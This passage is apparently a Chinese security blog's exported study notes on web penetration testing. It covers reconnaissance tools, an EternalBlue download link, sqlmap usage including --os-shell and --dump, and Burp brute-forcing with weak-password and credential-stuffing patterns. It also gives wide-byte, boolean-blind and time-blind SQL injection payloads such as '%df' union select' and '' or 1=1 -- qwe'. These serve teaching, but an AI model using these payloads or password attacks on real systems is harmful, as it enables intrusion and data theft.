<h3 id="旁站查询"><a href="#旁站查询" class="headerlink" title="旁站查询"></a>旁站查询</h3><ul>
<li>旁站其实就是同IP站点，一定和目标站点在同一个内网或者是同一台服务器</li>
</ul>
<h3 id="C段查询"><a href="#C段查询" class="headerlink" title="C段查询"></a>C段查询</h3><ul>
<li>C段可能是同一个内网，同一个公司</li>
</ul>
<h3 id="内容敏感信息泄露"><a href="#内容敏感信息泄露" class="headerlink" title="内容敏感信息泄露"></a>内容敏感信息泄露</h3><ul>
<li>谷歌语法得到其他的东西</li>
</ul>
<h2 id="怎么去收集"><a href="#怎么去收集" class="headerlink" title="怎么去收集"></a>怎么去收集</h2><h3 id="whois如何收集"><a href="#whois如何收集" class="headerlink" title="whois如何收集"></a>whois如何收集</h3><ul>
<li><p>在线工具</p>
<ul>
<li><a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></li>
<li><a href="https://www.whois.com/">https://www.whois.com/</a></li>
</ul>
</li>
</ul>
<h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h3><ul>
<li><p>通过Nmap [Kali自带]</p>
<ul>
<li><p>腾讯课堂Kali公开课 如何使用Nmap</p>
<ul>
<li><a href="https://ke.qq.com/course/373928?flowToken=1029667">https://ke.qq.com/course/373928?flowToken=1029667</a></li>
</ul>
</li>
<li><p>基础命令</p>
<ul>
<li><p>-p</p>
<ul>
<li>指定端口扫描</li>
</ul>
</li>
<li><p>-v</p>
<ul>
<li>显示扫描过程</li>
</ul>
</li>
<li><p>-Pn</p>
<ul>
<li>跳过主机发现过程直接端口扫描 [目标禁ping时]</li>
</ul>
</li>
<li><p>-O</p>
<ul>
<li>探测主机操作系统</li>
</ul>
</li>
<li><p>-A</p>
<ul>
<li>全面扫描，包括一切探测</li>
</ul>
</li>
</ul>
</li>
<li><p>端口扫描状态</p>
<ul>
<li>Opend 端口开放</li>
<li>Closed 端口关闭</li>
<li>Filtered 端口被过滤</li>
</ul>
</li>
</ul>
</li>
<li><p>在线工具</p>
<ul>
<li><a href="https://tool.chinaz.com/port/">https://tool.chinaz.com/port/</a></li>
</ul>
</li>
<li><p>利用永恒之蓝直接拿下服务器</p>
<ul>
<li>链接：<a href="https://pan.baidu.com/s/1m5F-7vLC3lpVYOcNcIpLwA">https://pan.baidu.com/s/1m5F-7vLC3lpVYOcNcIpLwA</a> </li>
<li>提取码：zkaq </li>
</ul>
</li>
</ul>
<h3 id="旁站"><a href="#旁站" class="headerlink" title="旁站"></a>旁站</h3><ul>
<li><p>在线工具</p>
<ul>
<li><a href="http://stool.chinaz.com/same">http://stool.chinaz.com/same</a></li>
<li><a href="https://www.webscan.cc/">https://www.webscan.cc/</a></li>
</ul>
</li>
</ul>
<h3 id="C段"><a href="#C段" class="headerlink" title="C段"></a>C段</h3><ul>
<li>得到IP然后自己推算就可以</li>
</ul>
<h3 id="目录扫描-1"><a href="#目录扫描-1" class="headerlink" title="目录扫描"></a>目录扫描</h3><ul>
<li><p>御剑扫描</p>
<ul>
<li>小技巧： 看看君子协议robots.txt</li>
</ul>
</li>
</ul>
<h3 id="指纹识别-1"><a href="#指纹识别-1" class="headerlink" title="指纹识别"></a>指纹识别</h3><ul>
<li><p>在线工具</p>
<ul>
<li><p>在线指纹识别</p>
<ul>
<li><a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com/</a></li>
</ul>
</li>
<li><p>微步社区</p>
<ul>
<li><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></li>
</ul>
</li>
<li><p>潮汐指纹</p>
<ul>
<li><a href="http://finger.tidesec.com/">http://finger.tidesec.com/</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>https://www.yunsee.cn/
</code></pre><h3 id="内容敏感信息"><a href="#内容敏感信息" class="headerlink" title="内容敏感信息"></a>内容敏感信息</h3><ul>
<li><p>谷歌语法</p>
<ul>
<li><p>site:</p>
<ul>
<li>指定域名</li>
</ul>
</li>
<li><p>filetype:</p>
<ul>
<li>指定文件类型</li>
</ul>
</li>
<li><p>inurl:</p>
<ul>
<li>指定URL</li>
</ul>
</li>
<li><p>link:</p>
<ul>
<li>包含指定网页的链接的网页</li>
</ul>
</li>
<li><p>intitle:</p>
<ul>
<li>指定title</li>
</ul>
</li>
<li><p>intext:</p>
<ul>
<li>指定内容</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="子域名-1"><a href="#子域名-1" class="headerlink" title="子域名"></a>子域名</h3><ul>
<li><p>谷歌语法</p>
<ul>
<li>site: 指定域名</li>
</ul>
</li>
<li><p>在线平台</p>
<ul>
<li><p>ip反查域名</p>
<ul>
<li><a href="https://dns.aizhan.com/">https://dns.aizhan.com/</a></li>
<li><a href="https://reverseip.domaintools.com/">https://reverseip.domaintools.com/</a>  (因为有人查过他记录)</li>
</ul>
</li>
<li><p>微步社区</p>
<ul>
<li><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></li>
</ul>
</li>
<li><p>站长工具</p>
<ul>
<li><a href="http://tool.chinaz.com/subdomain/">http://tool.chinaz.com/subdomain/</a></li>
</ul>
</li>
<li><p>潮汐指纹</p>
<ul>
<li><a href="http://finger.tidesec.com/">http://finger.tidesec.com/</a></li>
</ul>
</li>
</ul>
</li>
<li><p>使用工具爆破DNS服务器</p>
<ul>
<li><p>PYthon</p>
<ul>
<li><p>subDomainsBrute</p>
<ul>
<li><a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></li>
</ul>
</li>
</ul>
</li>
<li><p>exe工具</p>
<ul>
<li>Layer.exe</li>
</ul>
</li>
</ul>
</li>
<li><p>网页内蜘蛛爬虫</p>
<ul>
<li><p>之后的课程会教</p>
<p><em>XMind: ZEN - Trial Version</em></p>
</li>
</ul>
</li>
</ul>
<p><em>XMind: ZEN - Trial Version</em></p>
]]></content>
      <categories>
        <category>web渗透</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>内网信息收集(Nmap与Hydra)</title>
    <url>/2023/08/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-Nmap%E4%B8%8EHydra/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>反序列化漏洞</title>
    <url>/2023/08/21/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>内网渗透</title>
    <url>/2023/08/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>变量覆盖漏洞</title>
    <url>/2023/08/21/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>命令执行漏洞</title>
    <url>/2023/08/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>文件上传漏洞</title>
    <url>/2023/08/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>宽字节注入</title>
    <url>/2023/08/21/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="魔术引号"><a href="#魔术引号" class="headerlink" title="魔术引号"></a>魔术引号</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>不让你闭合的一个函数</p>
<h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><p>在PHP的低版本中,是需要修改配置文件,全局强行执行的: magic_quotes_gpc</p>
<p>但是在高版本中,删除掉了这个配置,通过特定的函数进行过滤:addslashes()</p>
<h2 id="如何绕过魔术引号"><a href="#如何绕过魔术引号" class="headerlink" title="如何绕过魔术引号?"></a>如何绕过魔术引号?</h2><h3 id="1-找不需要闭合的注入点"><a href="#1-找不需要闭合的注入点" class="headerlink" title="1.找不需要闭合的注入点"></a>1.找不需要闭合的注入点</h3><p>例如猫舍,select * from news where id=1</p>
<h3 id="2-仔细查看作用域"><a href="#2-仔细查看作用域" class="headerlink" title="2.仔细查看作用域"></a>2.仔细查看作用域</h3><p>魔术引号是作用于cookie,post和get传参的,所以例如head注入可以尝试($_SEVRVER)</p>
<h3 id="3-宽字节注入"><a href="#3-宽字节注入" class="headerlink" title="3.宽字节注入"></a>3.宽字节注入</h3><h1 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h1><p>GBK编码:双字节编码<br>单字节编码:ASCII上能找到的都是单字节编码</p>
<p>\  ==&gt;  ASCII(92)  是个单字节<br>两个单字节 ==&gt; 双子姐</p>
<p>因此,数据库使用GBK编码可能存在宽字节注入</p>
<h2 id="核心"><a href="#核心" class="headerlink" title="核心:"></a>核心:</h2><p>穿一个字符将反斜杠吃掉</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1?\&#x27;</span>     <span class="string">&#x27;or 1=1-- qwe</span></span><br></pre></td></tr></table></figure>
<h1 id="注入实现"><a href="#注入实现" class="headerlink" title="注入实现"></a>注入实现</h1><h2 id="df与-可以组成汉字运"><a href="#df与-可以组成汉字运" class="headerlink" title="%df与/可以组成汉字运"></a>%df与/可以组成汉字运</h2><p>/    ==&gt;   %5c</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span>df<span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()-- qwwe</span></span><br></pre></td></tr></table></figure>
<h2 id="后续引号处理问题"><a href="#后续引号处理问题" class="headerlink" title="后续引号处理问题"></a>后续引号处理问题</h2><p>当需要查查询列名时,会需要用到where table_name=’xxx’的操作,但是这里的引号还是会被转义,有两个解决办法</p>
<h3 id="1-套娃"><a href="#1-套娃" class="headerlink" title="1.套娃"></a>1.套娃</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span>df<span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema = database() limit 0,1)-- qwwee</span></span><br></pre></td></tr></table></figure>
<p>即将表名变为子查询语句,但是太繁琐</p>
<h3 id="2-十六进制法"><a href="#2-十六进制法" class="headerlink" title="2.十六进制法"></a>2.十六进制法</h3><p>MySQL支持十六进制输入替代字符串(0x….)</p>
<p>即查出表名的十六进制,替换表明计科</p>
<h1 id="sqlmap跑的细节"><a href="#sqlmap跑的细节" class="headerlink" title="sqlmap跑的细节"></a>sqlmap跑的细节</h1><p>如果跑sqlmap则需要先在url后面加上一个单字节%df,否则软件跑不出来</p>
<h1 id="post表单怎么进行-df"><a href="#post表单怎么进行-df" class="headerlink" title="post表单怎么进行%df?"></a>post表单怎么进行%df?</h1><p>因为不走url,所以原则上是不会进行url编码的,因此不能直接写%df</p>
<p>正确的做法是  :<br>1.先用一个字母代替,然后再burp中的hex里修改这个字母为df<br>admina’or 1=1— qwe</p>
<p>2.如果当前页面是utf-8编码,则可以在表单内传一个汉字,比如聂,是%e8%81%32后面加单引号则被识别组成为两个汉字,右单引号逃逸.</p>
]]></content>
      <categories>
        <category>web渗透</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>支付漏洞</title>
    <url>/2023/08/21/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>文件包含漏洞</title>
    <url>/2023/08/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>渗透测试常用工具</title>
    <url>/2023/08/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h1 id="渗透测试常用工具"><a href="#渗透测试常用工具" class="headerlink" title="渗透测试常用工具"></a>渗透测试常用工具</h1><h2 id="sqlmap-自动化SQL注入工具"><a href="#sqlmap-自动化SQL注入工具" class="headerlink" title="sqlmap       (自动化SQL注入工具)"></a>sqlmap       (自动化SQL注入工具)</h2><p>SQL注入：第一个漏洞[1998年的时候就提出]<br>OWASP TOP 10 年度十佳漏洞 （注入漏洞排第一）</p>
<p>判断:SQL注入是TOP10最佳漏洞?     (错误)<br>榜首的是注入攻击 - (SQL注入攻击)  在真的项目中不常见</p>
<p>SQL: 结构化查询语句 [数据库代码]<br>注入: 把恶意的代码注入到原本的语句中<br>SQL注入：把恶意的代码注入到SQL语句中[恶意的代码]</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot;select *from admin where username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line"></span><br><span class="line">$username 是用户的传参</span><br><span class="line">$password 是用户的传参</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span> admin <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;123456&#x27;</span></span><br><span class="line"></span><br><span class="line">不知道别人密码的情况下如何登录别人账户？</span><br><span class="line">万能密码（<span class="keyword">SQL</span>注入）</span><br><span class="line">密码：   <span class="string">&#x27; or 1=1 -- qwe       (引号内是字符串，引号外是代码) 闭合</span></span><br><span class="line"><span class="string">把原有的语句闭合掉，然后让后面运行自己写的恶意语句</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">select * from admin where username=&#x27;</span>admin<span class="string">&#x27; and password=&#x27;&#x27; or 1=1 -- qwe&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> 两个条件都满足才可以</span><br><span class="line"></span><br><span class="line"><span class="keyword">or</span> 一个条件满足就行了</span><br><span class="line"></span><br><span class="line"><span class="literal">True</span> <span class="keyword">and</span> <span class="literal">False</span> <span class="keyword">or</span> <span class="literal">True</span></span><br><span class="line"><span class="literal">False</span> <span class="keyword">or</span> <span class="literal">True</span></span><br><span class="line">得到结果了</span><br><span class="line"></span><br><span class="line"><span class="comment">--空格  // 注释，里面写的东西不是代码，他是对代码的解释</span></span><br><span class="line">	空格写在传参的末尾，非常容易被处理掉 <span class="comment">-- qwe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span>注入：用户输入的数据当作了<span class="keyword">SQL</span>代码进行执行（<span class="keyword">SQL</span>语句）</span><br><span class="line"></span><br><span class="line">	<span class="operator">-</span>u &quot;可能存在注入的地址&quot; <span class="operator">/</span><span class="operator">/</span>检测是否存在注入</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span><span class="type">boolean</span><span class="operator">-</span>based blind 布尔盲注</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>error<span class="operator">-</span>based 报错注入</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span><span class="type">time</span><span class="operator">-</span>based blind 时间盲注</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	库 表 字段 [数据]</span><br><span class="line"></span><br><span class="line">	<span class="comment">--dbs 查库 -D 指定库</span></span><br><span class="line">	<span class="comment">--tables 查表 -T 指定表</span></span><br><span class="line">	<span class="comment">--columns 查字段 -C 指定字段</span></span><br><span class="line">	<span class="comment">--dump 拖数据[慎重]</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">--delay=1   //访问延迟，一秒一次 [ban  关小黑屋]</span></span><br><span class="line">	<span class="comment">--flush-session  //sqlmap也会偷懒，只要跑过的数据，他会缓存，缓存之后就不跑了</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">--os-shell 直接拿下目标服务器</span></span><br><span class="line">		http:<span class="operator">/</span><span class="operator">/</span>rykm6453.ia.aqlab.cn<span class="operator">/</span>single.php?id<span class="operator">=</span><span class="number">1</span></span><br><span class="line">		shutdown 关机 不要运行，因为关机了其他同学没法做了</span><br><span class="line">	工具是有局限性的，有的时候会不好用，因为工具不灵活。</span><br><span class="line">	mysql高于<span class="number">5.0</span>的情况下有一个系统自带库，里面有很多对渗透有用的数据</span><br><span class="line"></span><br><span class="line">	<span class="comment">--technique 指定注入方式 </span></span><br><span class="line">		B: <span class="type">Boolean</span><span class="operator">-</span>based blind <span class="keyword">SQL</span> injection（布尔型注入）</span><br><span class="line">		E: Error<span class="operator">-</span>based <span class="keyword">SQL</span> injection（报错型注入）</span><br><span class="line">		U: <span class="keyword">UNION</span> query <span class="keyword">SQL</span> injection（可联合查询注入）</span><br><span class="line">		S: Stacked queries <span class="keyword">SQL</span> injection（可多语句查询注入）</span><br><span class="line">		T: <span class="type">Time</span><span class="operator">-</span>based blind <span class="keyword">SQL</span> injection（基于时间延迟注入）</span><br><span class="line"></span><br><span class="line">	用户手册：https:<span class="operator">/</span><span class="operator">/</span>www.cnblogs.com<span class="operator">/</span>hongfei<span class="operator">/</span>p<span class="operator">/</span><span class="number">3872156.</span>html</span><br></pre></td></tr></table></figure>
<h2 id="Burp-通过数据包做渗透-（抓包）"><a href="#Burp-通过数据包做渗透-（抓包）" class="headerlink" title="Burp(通过数据包做渗透 （抓包）)"></a>Burp(通过数据包做渗透 （抓包）)</h2><p>正常：浏览器 -&gt; 网站<br>抓包：浏览器 -&gt; Burp -&gt; 网站</p>
<pre><code>正常情况下数据包是不容易控制

    burp破解：https://www.zkaq.org/t/2178.html
        1、抓包
            监听着8080 本地8080端口的数据会到burp
            挂代理=&gt; 浏览器把数据给你指定的地址
                1、挂系统代理
                2、挂浏览器代理 ＜（＾－＾）＞

            需要安装证书：访问HTTPS网站的必须
                127.0.0.1:8080
                127.0.0.1:7777

        2、跑包
        跑包模板(不断的发送数据包)
        暴破：暴力破解（枚举、穷举）   前台能暴破、后台暴破 都是漏洞
            银行卡密码：6位纯数字   100万组合 000000-999999
            暴破账号密码：账户也可以跑（要看网站的返回）
</code></pre><p>​            </p>
<h3 id="最常见的后台账户名"><a href="#最常见的后台账户名" class="headerlink" title="最常见的后台账户名"></a>最常见的后台账户名</h3><p>​                                admin<br>​                                test<br>​                                ceshi<br>​                                a<br>​                                root<br>​                                administrator<br>​                                jishu<br>​                                yunwei</p>
<h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><p>人是有惯性,密码是需要人记忆的.</p>
<h4 id="典型的弱密码"><a href="#典型的弱密码" class="headerlink" title="典型的弱密码"></a>典型的弱密码</h4><p>[容易记的，普通人可能设的密码]</p>
<p>123456</p>
<p>123456789<br>00000000<br>88888888</p>
<h4 id="社工型弱密码"><a href="#社工型弱密码" class="headerlink" title="社工型弱密码"></a>社工型弱密码</h4><p>​                        根据个人信息组成</p>
<p>​                        姓名首拼+出生年月日<br>​                        姓名首拼+电话号码(身份证号码/身份证号码后几位)<br>​                        姓首拼+出生年月日<br>​                        姓首拼+电话号码(身份证号码/身份证号码后几位)</p>
<h3 id="撞库攻击"><a href="#撞库攻击" class="headerlink" title="撞库攻击"></a>撞库攻击</h3><p>​                        工商：<br>​                        农业：<br>​                        建设：<br>​                        信用社：<br>​    取款密码全部不同吗？大部分人都差不多，可能就是2-3个密码不断的变换</p>
]]></content>
      <categories>
        <category>web渗透</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>Burp</tag>
        <tag>SqlMap</tag>
      </tags>
  </entry>
  <entry>
    <title>盲注</title>
    <url>/2023/08/21/%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<h1 id="1-盲注的定义"><a href="#1-盲注的定义" class="headerlink" title="1.盲注的定义"></a>1.盲注的定义</h1><p>所谓的盲注就是在服务器没有错误回显的时候完成的注入攻击。服务器没有错误回显，对于攻击者来说缺少了非常重要的“调试信息”</p>
<p>没有回显的注入都可以使用盲注的做法:</p>
<p>=&gt;联合查询没有输出点,union不能用,猜不出字段</p>
<p>=&gt;报错注入无法使用[函数被禁,报错被关闭]</p>
<p>注意:盲注很繁琐,适合于工具</p>
<h1 id="2-布尔盲注"><a href="#2-布尔盲注" class="headerlink" title="2.布尔盲注"></a>2.布尔盲注</h1><h2 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h2><p>页面还是有反应的,查到数据的时候页面是正常的，查不到的时候页面是错误,即布尔盲注拥有很明显的true和false但是没有报错信息.</p>
<h2 id="布尔盲注原理"><a href="#布尔盲注原理" class="headerlink" title="布尔盲注原理"></a>布尔盲注原理</h2><p>select *from news where id=1 and database()=’’,如果是纯粹猜测,要猜到天荒地老.所以人们研究出来切割法,一位一位的分割出来,大大降低爆破难度</p>
<h3 id="如何分割"><a href="#如何分割" class="headerlink" title="如何分割?"></a>如何分割?</h3><h4 id="1、判断目标有多长"><a href="#1、判断目标有多长" class="headerlink" title="1、判断目标有多长"></a>1、判断目标有多长</h4><p>length() 判断字符串长度</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">12</span> <span class="comment">-- qwe</span></span><br><span class="line">这就知道了库的长度</span><br></pre></td></tr></table></figure>
<h4 id="2、开切"><a href="#2、开切" class="headerlink" title="2、开切"></a>2、开切</h4><p>需要一个sql函数, </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">substr(切什么,从哪里开始切,切多长)</span><br><span class="line">	<span class="keyword">select</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h4 id="3、数字可以比较：599-gt-399"><a href="#3、数字可以比较：599-gt-399" class="headerlink" title="3、数字可以比较：599&gt;399"></a>3、数字可以比较：599&gt;399</h4><h4 id="4-字符串也可以比较"><a href="#4-字符串也可以比较" class="headerlink" title="4.字符串也可以比较"></a>4.字符串也可以比较</h4><p>如果可以比较字符，那就不需要一个一个试了，直接找区间</p>
<p>此时引入ASCII编码,sql函数为:   ascii(你想转化的字符)</p>
<h4 id="5-找库名表名字段名"><a href="#5-找库名表名字段名" class="headerlink" title="5.找库名表名字段名"></a>5.找库名表名字段名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">32</span></span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"></span><br><span class="line">&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;1 -- qwe&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="6-得到结果的ASCII码值-进行转码即可"><a href="#6-得到结果的ASCII码值-进行转码即可" class="headerlink" title="6.得到结果的ASCII码值,进行转码即可"></a>6.得到结果的ASCII码值,进行转码即可</h4><p>可以使用char()函数,不需要找ASCII表对照</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="type">char</span>(<span class="number">107</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">119</span>,<span class="number">111</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">120</span>,<span class="number">105</span>,<span class="number">97</span>);</span><br></pre></td></tr></table></figure>
<h1 id="3-时间盲注"><a href="#3-时间盲注" class="headerlink" title="3.时间盲注"></a>3.时间盲注</h1><h2 id="适用场景-1"><a href="#适用场景-1" class="headerlink" title="适用场景"></a>适用场景</h2><p>无论做什么页面都一样,无论传参怎样,只返回一个true,页面都是正常的</p>
<h2 id="时间盲注原理"><a href="#时间盲注原理" class="headerlink" title="时间盲注原理"></a>时间盲注原理</h2><p>通过传入延时函数来查看web页面返回是否延时来判断是否存在注入,同时利用if语句进行判断数据的正确与否</p>
<h3 id="如何延时"><a href="#如何延时" class="headerlink" title="如何延时?"></a>如何延时?</h3><h4 id="1-延时函数"><a href="#1-延时函数" class="headerlink" title="1.延时函数"></a>1.延时函数</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot; and sleep(10) -- qwe</span><br></pre></td></tr></table></figure>
<h4 id="1-if-expr1-expr2-expr3"><a href="#1-if-expr1-expr2-expr3" class="headerlink" title="1.if(expr1,expr2,expr3)"></a>1.if(expr1,expr2,expr3)</h4><p>判断语句 如果第一个语句正确就执行第二个语句;如果错误执行第三个语句,即 if(条件，成立的时候XXX，不成立的时候XXX)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(length(database())<span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">120</span>,sleep(<span class="number">10</span>),<span class="number">0</span>)<span class="comment">-- qwe</span></span><br><span class="line"></span><br><span class="line"># 其余步骤和布尔盲注一样,只是根据延时与否判断是否为真</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web渗透</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>网站基础</title>
    <url>/2023/08/21/%E7%BD%91%E7%AB%99%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="网站基础"><a href="#网站基础" class="headerlink" title="网站基础"></a>网站基础</h1><h2 id="1-网站的组成部分："><a href="#1-网站的组成部分：" class="headerlink" title="1.网站的组成部分："></a>1.网站的组成部分：</h2><h3 id="1-前端："><a href="#1-前端：" class="headerlink" title="(1)前端："></a>(1)前端：</h3><p>展示给用户看的东西(页面上显示的一切)[可以看见]   F12<br>            三件套：HTML:CSS:JS</p>
<h3 id="2-后端："><a href="#2-后端：" class="headerlink" title="(2)后端："></a>(2)后端：</h3><p>实现功能（网站的绝大部分功能）</p>
<p>​    </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">前端在本地浏览器执行，后端服务器执行</span><br></pre></td></tr></table></figure>
<h2 id="2-动态语言："><a href="#2-动态语言：" class="headerlink" title="2.动态语言："></a>2.动态语言：</h2><p>后端语言 （不可见，作为用户你是看不见）</p>
<h3 id="1-PHP-全平台"><a href="#1-PHP-全平台" class="headerlink" title="(1)PHP 全平台"></a>(1)PHP 全平台</h3><p>  PHP是世界上最好的语言</p>
<p>​            1、PHP简单易懂、适合新手学习<br>​            2、PHP主要是中小型网站使用（漏洞多）一锤子买卖<br>​            3、PHP是渗透测试行业主流研究方案</p>
<h3 id="2-JSP-Java-全平台"><a href="#2-JSP-Java-全平台" class="headerlink" title="(2)JSP (Java)全平台"></a>(2)JSP (Java)全平台</h3><p>​            1、对于新手难上手。<br>​            2、Java主要是大型网站使用（漏洞少、维护人员多、安全保障人员多）</p>
<p>​        (经典渗透测试 PHP(后端) + Mysql(数据库)) 适合入门<br>​        (进阶渗透测试 Java(后端) + mysql/oracle/db2) 这个是以后的香饽饽<br>​    asp/aspx  （微软公司开发 只能用于windows）  越来越少<br>​    </p>
<h3 id="3-python站、Go的站、node-js站-全平台"><a href="#3-python站、Go的站、node-js站-全平台" class="headerlink" title="(3)python站、Go的站、node.js站  全平台"></a>(3)python站、Go的站、node.js站  全平台</h3><p>​    python、Go 主流编程语言（定位：个人编程语言）</p>
<h3 id="如何判定目标的后端语言"><a href="#如何判定目标的后端语言" class="headerlink" title="如何判定目标的后端语言"></a>如何判定目标的后端语言</h3><p>url是否存在.php .asp .aspx .jsp</p>
<p>访问任何的网站，其实都是在访问某台电脑的某个文件夹</p>
<h2 id="3-web容器-中间件-："><a href="#3-web容器-中间件-：" class="headerlink" title="3.web容器(中间件)："></a>3.web容器(中间件)：</h2><p>网站的基础结构（中间商）<br>        根据访问请求，判断改把这个请求交给谁处理<br>        通过访问文件的后缀决定的</p>
<h2 id="4-搭建网站"><a href="#4-搭建网站" class="headerlink" title="4.搭建网站"></a>4.搭建网站</h2><p>(需要前端代码，但是前端代码，不需要安装不需要下载)<br>        1、web容器<br>        2、后端代码(PHP)<br>        3、数据库</p>
<pre><code>    如果说自己安装、那么需要下载三个东西、而且需要改配置文件
    自己装好烦。

    一键式搭建网站软件
        JSP(Tomcat、Jspstudy)
        PHP(PHPStudy) windows ♥
        PHP(lnmp) linux
         宝塔&#123;最好用、安全性、扩展性&#125;、Lamp、upupw

    http://public.xp.cn/upgrades/phpStudy20161103.zip
</code></pre><h3 id="一个电脑-能搭建多少个网站？"><a href="#一个电脑-能搭建多少个网站？" class="headerlink" title="一个电脑 能搭建多少个网站？"></a>一个电脑 能搭建多少个网站？</h3><p>如果真的要搭，可以搭建无数个 (是利用目录)<br>                <a href="http://cntj8003.ia.aqlab.cn/bluecms/uploads/">http://cntj8003.ia.aqlab.cn/bluecms/uploads/</a><br>                <a href="http://cntj8003.ia.aqlab.cn/">http://cntj8003.ia.aqlab.cn/</a></p>
<p>​            在功能是两个站点，但是实际上是属于一个站，因为他们共用了端口</p>
